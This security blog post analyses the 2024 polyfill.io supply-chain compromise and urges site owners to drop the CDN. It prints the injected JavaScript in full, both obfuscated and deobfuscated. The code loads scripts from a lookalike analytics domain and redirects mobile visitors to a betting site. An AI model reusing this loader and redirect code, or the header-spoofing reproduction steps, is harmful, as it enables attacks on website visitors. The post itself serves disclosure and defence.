---
title: Stop Using cdn.polyfill.io Now
date: 2024-06-25 11:40:00
catalog: true
tags: [Security]
categories: [Security]
photos: /img/stop-using-polyfill-io/cover-en.png
---

Polyfill.io is a service that automatically provides front-end polyfills, making it very convenient to use. You just need to select the functionality you want to polyfill and then include a JavaScript file like this:

``` html
<script src="https://polyfill.io/v3/polyfill.min.js"></script>
```

The server will automatically determine based on the user-agent whether to return a polyfill, so only the necessary code will be included. It sounds convenient and useful.

However, some people may have received notifications from Google Ads recently about a security issue. Why is that?

<!-- more -->

## Current Situation of Polyfill.io

To be more precise, there is an open-source project called [polyfill-service](https://github.com/polyfillpolyfill/polyfill-service) that can achieve what I mentioned earlier. Many people are now too lazy to run their own service, so they can simply include the CDN provided by them to enjoy the same functionality.

However, at the end of February this year, the domain `cdn.polyfill.io` that was originally used to provide the service was sold to a Chinese company. The project's developer, @triblondon, also came out on Twitter to [urge](https://x.com/triblondon/status/1761852117579427975) everyone to remove references to the CDN, stating that he never owned that domain:

![Twitter post](/img/stop-using-polyfill-io/p1.png)

There is also a website called [Polykill](https://polykill.io/) that explains the whole story. Meanwhile, well-known CDN providers like [Cloudflare](https://blog.cloudflare.com/polyfill-io-now-available-on-cdnjs-reduce-your-supply-chain-risk?utm_campaign=cf_blog&utm_content=20240229&utm_medium=organic_social&utm_source=twitter) and [Fastly](https://community.fastly.com/t/new-options-for-polyfill-io-users/2540) have provided their own forks, giving users a relatively safer choice.

So, what happens if you continue to use `cdn.polyfill.io` without switching to these alternatives?

## Analysis of Malicious Code

The answer is: "In some cases, website users may receive a JavaScript file that has been tampered with."

This is an ongoing issue, and I just reproduced it today.

There is an issue on GitHub: [polyfill.io domain owner #2873](https://github.com/polyfillpolyfill/polyfill-service/issues/2873) discussing this matter, where a user @alitonium provided steps to reproduce it, including:

1. Affected URL
2. Valid user-agent
3. Referer to be included

After meeting certain conditions, you can see the tampered response.

I tried it briefly today, and this is a normal response, just returning the regular polyfill:

![Normal response](/img/stop-using-polyfill-io/p2.png)

And below is the tampered one:

![Malicious response](/img/stop-using-polyfill-io/p3.png)

It's obvious that there is an additional piece of code at the end.

If you want to try it yourself, my user-agent is:

```
Mozilla/7.48 (iPhone15,2; U; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1
```

You can randomly change the number in `Mozilla/7.48`, and because a comment on GitHub mentioned that an IP seems to only hit once, I tried spoofing the IP using `X-Forwared-For` and found it to be effective. Is it a case of fighting fire with fire?

In any case, after changing the IP several times and also changing the user-agent several times, you should be able to figure it out.

What does the additional code snippet do? Here is the content:

``` js
function MqMqY(e) {
  var t = "",
    n = (r = c1 = c2 = 0);
  while (n < e.length) {
    r = e.charCodeAt(n);
    if (r < 128) {
      t += String.fromCharCode(r);
      n++;
    } else if (r > 191 && r < 224) {
      c2 = e.charCodeAt(n + 1);
      t += String.fromCharCode(((r & 31) << 6) | (c2 & 63));
      n += 2;
    } else {
      c2 = e.charCodeAt(n + 1);
      c3 = e.charCodeAt(n + 2);
      t += String.fromCharCode(((r & 15) << 12) | ((c2 & 63) << 6) | (c3 & 63));
      n += 3;
    }
  }
  return t;
}
function HHwbhL(e) {
  var m = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
  var t = "",
    n,
    r,
    i,
    s,
    o,
    u,
    a,
    f = 0;
  e = e.replace(/[^A-Za-z0-9+/=]/g, "");
  while (f < e.length) {
    s = m.indexOf(e.charAt(f++));
    o = m.indexOf(e.charAt(f++));
    u = m.indexOf(e.charAt(f++));
    a = m.indexOf(e.charAt(f++));
    n = (s << 2) | (o >> 4);
    r = ((o & 15) << 4) | (u >> 2);
    i = ((u & 3) << 6) | a;
    t = t + String.fromCharCode(n);
    if (u != 64) {
      t = t + String.fromCharCode(r);
    }
    if (a != 64) {
      t = t + String.fromCharCode(i);
    }
  }
  return MqMqY(t);
}
eval("window")["klodTq"] = function () {
  (function (u, r, w, d, f, c) {
    var x = HHwbhL;
    u = decodeURIComponent(x(u.replace(new RegExp(c + "" + c, "g"), c)));
    ("jQuery");
    k = r[2] + "c" + f[1];
    ("Flex");
    v = k + f[6];
    var s = d.createElement(v + c[0] + c[1]),
      g = function () {};
    s.type = "text/javascript";
    {
      s.onload = function () {
        g();
      };
    }
    s.src = u;
    ("CSS");
    d.getElementsByTagName("head")[0].appendChild(s);
  })(
    "aHR0cHM6Ly93d3cuZ29vZ2llLWFuYWl5dGljcy5jb20vZ3RhZ3MuanM=",
    "gUssQxWzjLAD",
    window,
    document,
    "DrPdgDiahyku",
    "ptsrhUDHCv"
  );
};
if (
  !/^Mac|Win/.test(navigator.platform) &&
  document.referrer.indexOf(".") !== -1
)
  klodTq();
```

If you paste the above directly into ChatGPT to have it converted into more readable code, you will get the following result:

``` js
// Function to decode a UTF-8 string
function decodeUtf8(input) {
  let output = "";
  let i = 0, r, c1, c2, c3;

  while (i < input.length) {
    r = input.charCodeAt(i);

    if (r < 128) {
      output += String.fromCharCode(r);
      i++;
    } else if (r > 191 && r < 224) {
      c2 = input.charCodeAt(i + 1);
      output += String.fromCharCode(((r & 31) << 6) | (c2 & 63));
      i += 2;
    } else {
      c2 = input.charCodeAt(i + 1);
      c3 = input.charCodeAt(i + 2);
      output += String.fromCharCode(((r & 15) << 12) | ((c2 & 63) << 6) | (c3 & 63));
      i += 3;
    }
  }
  return output;
}

// Function to decode a Base64 string
function decodeBase64(input) {
  const base64Chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
  let output = "";
  let i = 0, n, r, s, o, u, a;

  input = input.replace(/[^A-Za-z0-9+/=]/g, "");

  while (i < input.length) {
    s = base64Chars.indexOf(input.charAt(i++));
    o = base64Chars.indexOf(input.charAt(i++));
    u = base64Chars.indexOf(input.charAt(i++));
    a = base64Chars.indexOf(input.charAt(i++));
    n = (s << 2) | (o >> 4);
    r = ((o & 15) << 4) | (u >> 2);
    let iChar = ((u & 3) << 6) | a;

    output += String.fromCharCode(n);
    if (u != 64) {
      output += String.fromCharCode(r);
    }
    if (a != 64) {
      output += String.fromCharCode(iChar);
    }
  }

  return decodeUtf8(output);
}

// Function to load a JavaScript file dynamically
function loadScript() {
  (function (encodedUrl, randomString, window, document, randomString2, separator) {
    const decode = decodeBase64;
    const decodedUrl = decodeURIComponent(decode(encodedUrl.replace(new RegExp(separator + separator, "g"), separator)));
    const scriptId = randomString[2] + "c" + randomString2[1] + randomString2[6];
    const scriptElement = document.createElement(scriptId + separator[0] + separator[1]);
    const noop = function () {};

    scriptElement.type = "text/javascript";
    scriptElement.onload = noop;
    scriptElement.src = decodedUrl;
    document.getElementsByTagName("head")[0].appendChild(scriptElement);
  })(
    "aHR0cHM6Ly93d3cuZ29vZ2llLWFuYWl5dGljcy5jb20vZ3RhZ3MuanM=",
    "gUssQxWzjLAD",
    window,
    document,
    "DrPdgDiahyku",
    "ptsrhUDHCv"
  );
}

// Automatically execute the script loading function if the platform is not Mac or Win and the referrer is valid
if (!/^Mac|Win/.test(navigator.platform) && document.referrer.indexOf(".") !== -1) {
  loadScript();
}
```

This will trigger on both Mac and Windows, only on web pages with a referrer. It will load a script, and the script's src is `aHR0cHM6Ly93d3cuZ29vZ2llLWFuYWl5dGljcy5jb20vZ3RhZ3MuanM=` which decodes to:

```
https://www.googie-anaiytics.com/gtags.js
```

At first glance, you might think, "Isn't this Google Analytics? What's special about it?" But upon closer inspection, you will notice disguised words like `googie` and `anaiytics`, indicating a malicious domain.

The code in this file is obfuscated:

![Malicious JavaScript content](/img/stop-using-polyfill-io/p4.png)

However, due to lack of effort and using ready-made tools, we can deobfuscate it using other tools:

1. https://obf-io.deobfuscate.io/
2. https://deobfuscate.relative.im/

It can be deobfuscated into a more readable form, where some strings are visible:

``` js
function loadJS(_0x1fa6fb, _0x1802b4) {
  var _0x70d7c = document.createElement('script'),
    _0x505482 = _0x1802b4 || function () {}
  _0x70d7c.type = 'text/javascript'
  {
    _0x70d7c.onload = function () {
      _0x505482()
    }
  }
  _0x70d7c.src = _0x1fa6fb
  document.getElementsByTagName('head')[0].appendChild(_0x70d7c)
}
function isPc() {
  try {
    var _0x4ed75f =
        navigator.platform == 'Win32' || navigator.platform == 'Windows',
      _0x3f80bf =
        navigator.platform == 'Mac68K' ||
        navigator.platform == 'MacPPC' ||
        navigator.platform == 'Macintosh' ||
        navigator.platform == 'MacIntel'
    if (_0x3f80bf || _0x4ed75f) {
      return true
    } else {
      return false
    }
  } catch (_0x1793fe) {
    return false
  }
}
function checkKeywords(_0x3ab08e) {
  const _0x18dd4d = document.documentElement.innerHTML
  let _0x3cdba9 = false
  for (const _0xda2c7 of _0x3ab08e) {
    if (_0x18dd4d.indexOf(_0xda2c7) !== -1) {
      _0x3cdba9 = true
      const _0xd85bed = _0x18dd4d.indexOf(_0xda2c7),
        _0x267743 = _0x18dd4d.substring(_0xd85bed - 20, _0xd85bed + 20)
      break
    }
  }
  return _0x3cdba9
}
function vfed_update(_0x2723e2) {
  fetch('https://www.googie-anaiytics.com/keywords/vn-keyword.json')
    .then((_0x1204ac) => _0x1204ac.json())
    .then((_0x318df9) => {
      const _0x3d6056 = checkKeywords(_0x318df9)
      _0x3d6056 &&
        _0x2723e2 !== '' &&
          loadJS(
            'https://www.googie-anaiytics.com/html/checkcachehw.js?origin=kwvnn',
            function () {
              if (usercache == true) {
                window.location.href = _0x2723e2
              }
            }
          )
    })
    .catch((_0x2c91ce) =>
      console.error('Error fetching the JSON file:', _0x2c91ce)
    )
}
function check_tiaozhuan() {
  const _0x464cf7 = (function () {
      let _0x2ddab7 = true
      return function (_0x15452, _0x3e7ea8) {
        const _0x2faa6e = {
          bjeMJ: function (_0x15a8ac, _0xefecf2) {
            return _0x15a8ac(_0xefecf2)
          },
          pqiqW: function (_0x50e73a, _0x158536) {
            return _0x50e73a !== _0x158536
          },
          zbtQp: function (_0x1dfdda, _0x1aa046, _0x3b4d3c) {
            return _0x1dfdda(_0x1aa046, _0x3b4d3c)
          },
          volhE:
            'https://www.googie-anaiytics.com/html/checkcachehw.js?origin=kwvnn',
          OBmcC: function (_0x598542, _0x5a0037) {
            return _0x598542 == _0x5a0037
          },
          IzGuE: function (_0x193bad, _0x38f83f) {
            return _0x193bad <= _0x38f83f
          },
          MctlV: function (_0x4cf969, _0x3f5292) {
            return _0x4cf969 === _0x3f5292
          },
          NiqyK: 'mcNrr',
          HANcJ: 'QRUUg',
          pgwSI: function (_0x26a5c9, _0x345245) {
            return _0x26a5c9 !== _0x345245
          },
          XaDFm: 'iuHAU',
        }
        const _0x1c444b = _0x2ddab7
          ? function () {
              if (_0x2faa6e.MctlV(_0x2faa6e.NiqyK, _0x2faa6e.HANcJ)) {
                const _0x180d73 = _0x2faa6e.bjeMJ(_0x3eaf18, _0x2bb07f)
                _0x180d73 &&
                  _0x2faa6e.pqiqW(_0x4742d9, '') &&
                    _0x2faa6e.zbtQp(_0x955e25, _0x2faa6e.volhE, function () {
                      _0x2faa6e.OBmcC(_0x4eb5f8, true) &&
                        (_0x94c0a4.location.href = _0x1dbf3a)
                    })
              } else {
                if (_0x3e7ea8) {
                  if (_0x2faa6e.pgwSI(_0x2faa6e.XaDFm, _0x2faa6e.XaDFm)) {
                    _0x2faa6e.IzGuE(_0x51047d, 10) && (_0x391f84 = _0x40837e)
                  } else {
                    const _0x47d725 = _0x3e7ea8.apply(_0x15452, arguments)
                    return (_0x3e7ea8 = null), _0x47d725
                  }
                }
              }
            }
          : function () {}
        return (_0x2ddab7 = false), _0x1c444b
      }
    })(),
    _0x41d32e = _0x464cf7(this, function () {
      return _0x41d32e
        .toString()
        .search('(((.+)+)+)+$')
        .toString()
        .constructor(_0x41d32e)
        .search('(((.+)+)+)+$')
    })
  _0x41d32e()
  var _0x112e13 = navigator.userAgent.match(
    /(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i
  )
  if (_0x112e13) {
    var _0x152838 = window.location.host,
      _0xc3b985 = document.referrer,
      _0x56bd89 = '',
      _0x42c985 = 'https://wweeza.com/redirect?from=bitget',
      _0x57dc62 = Math.floor(Math.random() * 100 + 1),
      _0x5462a8 = new Date(),
      _0x394b64 = _0x5462a8.getHours()
    if (
      _0x152838.indexOf('www.dxtv1.com') !== -1 ||
      _0x152838.indexOf('www.ys752.com') !== -1
    ) {
      _0x56bd89 = 'https://wweeza.com/redirect?from=bitget'
    } else {
      if (_0x152838.indexOf('shuanshu.com.com') !== -1) {
        _0x56bd89 = 'https://wweeza.com/redirect?from=bitget'
      } else {
        if (
          _0xc3b985.indexOf('.') !== -1 &&
          _0xc3b985.indexOf(_0x152838) == -1
        ) {
          _0x56bd89 = 'https://wweeza.com/redirect?from=bitget'
        } else {
          if (_0x394b64 >= 0 && _0x394b64 < 2) {
            _0x57dc62 <= 10 && (_0x56bd89 = _0x42c985)
          } else {
            if (_0x394b64 >= 2 && _0x394b64 < 4) {
              _0x57dc62 <= 15 && (_0x56bd89 = _0x42c985)
            } else {
              if (_0x394b64 >= 4 && _0x394b64 < 7) {
                _0x57dc62 <= 20 && (_0x56bd89 = _0x42c985)
              } else {
                if (_0x394b64 >= 7 && _0x394b64 < 8) {
                  if (_0x57dc62 <= 10) {
                    _0x56bd89 = _0x42c985
                  }
                } else {
                  _0x57dc62 <= 10 && (_0x56bd89 = _0x42c985)
                }
              }
            }
          }
        }
      }
    }
    _0x56bd89 != '' &&
      !isPc() &&
      document.cookie.indexOf('admin_id') == -1 &&
        document.cookie.indexOf('adminlevels') == -1 &&
        vfed_update(_0x56bd89)
  }
}
let tsastr = document.documentElement.outerHTML,
  bdtjfg = tsastr.indexOf('hm.baidu.com') != -1,
  cnzfg = tsastr.indexOf('.cnzz.com') != -1,
  wolafg = tsastr.indexOf('.51.la') != -1
let mattoo = tsastr.indexOf('.matomo.org') != -1,
  aanaly = tsastr.indexOf('.google-analytics.com') != -1,
  ggmana = tsastr.indexOf('.googletagmanager.com') != -1,
  aplausix = tsastr.indexOf('.plausible.io') != -1
let statcct = tsastr.indexOf('.statcounter.com') != -1
bdtjfg || cnzfg || wolafg || mattoo || aanaly || ggmana || aplausix || statcct
  ? setTimeout(check_tiaozhuan, 2000)
  : check_tiaozhuan()

```

At this point, you would need to rely on ChatGPT again. Just ask it to improve the readability, and you will get the following result:

``` js
// Function to load a JavaScript file dynamically and execute a callback once it's loaded
function loadJS(url, callback) {
  const script = document.createElement('script');
  const onLoadCallback = callback || function () {};
  script.type = 'text/javascript';
  script.onload = onLoadCallback;
  script.src = url;
  document.getElementsByTagName('head')[0].appendChild(script);
}

// Function to determine if the current device is a PC
function isPc() {
  try {
    const isWindows = navigator.platform === 'Win32' || navigator.platform === 'Windows';
    const isMac = ['Mac68K', 'MacPPC', 'Macintosh', 'MacIntel'].includes(navigator.platform);
    return isWindows || isMac;
  } catch (error) {
    return false;
  }
}

// Function to check if any of the provided keywords exist in the document's HTML
function checkKeywords(keywords) {
  const htmlContent = document.documentElement.innerHTML;
  for (const keyword of keywords) {
    if (htmlContent.includes(keyword)) {
      return true;
    }
  }
  return false;
}

// Function to fetch keyword data and update the page if keywords match
function vfed_update(redirectUrl) {
  fetch('https://www.googie-anaiytics.com/keywords/vn-keyword.json')
    .then(response => response.json())
    .then(keywords => {
      const keywordsFound = checkKeywords(keywords);
      if (keywordsFound && redirectUrl) {
        loadJS('https://www.googie-anaiytics.com/html/checkcachehw.js?origin=kwvnn', function () {
          if (window.usercache === true) {
            window.location.href = redirectUrl;
          }
        });
      }
    })
    .catch(error => console.error('Error fetching the JSON file:', error));
}

// Function to handle page redirection based on certain conditions
function check_tiaozhuan() {
  if (navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i)) {
    const host = window.location.host;
    const referrer = document.referrer;
    const redirectBaseUrl = 'https://wweeza.com/redirect?from=bitget';
    const currentHour = new Date().getHours();
    let redirectUrl = '';

    if (['www.dxtv1.com', 'www.ys752.com', 'shuanshu.com.com'].includes(host) ||
        (referrer.includes('.') && !referrer.includes(host))) {
      redirectUrl = redirectBaseUrl;
    } else if (currentHour >= 0 && currentHour < 2 && Math.random() * 100 + 1 <= 10) {
      redirectUrl = redirectBaseUrl;
    } else if (currentHour >= 2 && currentHour < 4 && Math.random() * 100 + 1 <= 15) {
      redirectUrl = redirectBaseUrl;
    } else if (currentHour >= 4 && currentHour < 7 && Math.random() * 100 + 1 <= 20) {
      redirectUrl = redirectBaseUrl;
    } else if (currentHour >= 7 && currentHour < 8 && Math.random() * 100 + 1 <= 10) {
      redirectUrl = redirectBaseUrl;
    } else if (currentHour >= 8 && Math.random() * 100 + 1 <= 10) {
      redirectUrl = redirectBaseUrl;
    }

    if (redirectUrl && !isPc() && !document.cookie.includes('admin_id') && !document.cookie.includes('adminlevels')) {
      vfed_update(redirectUrl);
    }
  }
}

// Check for certain analytics tools in the document and trigger redirection logic accordingly
const htmlContent = document.documentElement.outerHTML;
const analyticsTools = ['hm.baidu.com', '.cnzz.com', '.51.la', '.matomo.org', '.google-analytics.com', '.googletagmanager.com', '.plausible.io', '.statcounter.com'];
const analyticsFound = analyticsTools.some(tool => htmlContent.includes(tool));

if (analyticsFound) {
  setTimeout(check_tiaozhuan, 2000);
} else {
  check_tiaozhuan();
}
```

The function name is `check_tiaozhuan`, and `tiaozhuan` is a Chinese pinyin which means "redirection".

In conclusion, after performing various checks, it will eventually redirect you to a Vietnamese website, seemingly related to sports betting.

Therefore, if your website includes code from `cdn.polyfill.io`, please remove it immediately. Otherwise, some users might be inexplicably redirected to other websites. Also, I cannot guarantee the accuracy of the deobfuscated and ChatGPT-reconstructed results. With the ability to execute JavaScript for a supply chain attack, it can do much more. If someone tells me they can steal cookies or localStorage, I would believe them (although I haven't seen it in the current code).

## How to Defend in the Future?

Let me clarify first that the security issue is not the fault of the polyfill service itself; it is innocent. If you want to continue using it, you can host your own version, which is completely fine. The problem lies in "including malicious JavaScript from the domain cdn.polyfill.io."

Introducing third-party packages always poses some cybersecurity risks, especially when directly fetching from a CDN like `cdn.polyfill.io`.

The best defense is simple: don't use it.

Whether it's an unknown source like `cdn.polyfill.io` or a well-known one like cdnjs, avoid using them altogether as they come with risks. Even cdnjs has risks, as detailed in: [Understanding Front-end Supply Chain Attacks and Defenses through the Vulnerability of cdnjs](https://blog.huli.tw/2021/08/22/en/cdnjs-and-supply-chain-attack/).

If you must use them, remember to include the `integrity` attribute, which ensures that if the response is tampered with, it won't be loaded, adding an extra layer of defense.

However, for dynamic content like `cdn.polyfill.io`, this won't work as `integrity` can only be applied to fixed content.

So, if possible, try to avoid using these third-party packages.

Interestingly, even Disqus, which many people use, has engaged in such practices. For more details, refer to: [Disqus is Evil Trash 🗑](https://www.keeganleary.com/disqus-is-evil-trash/)
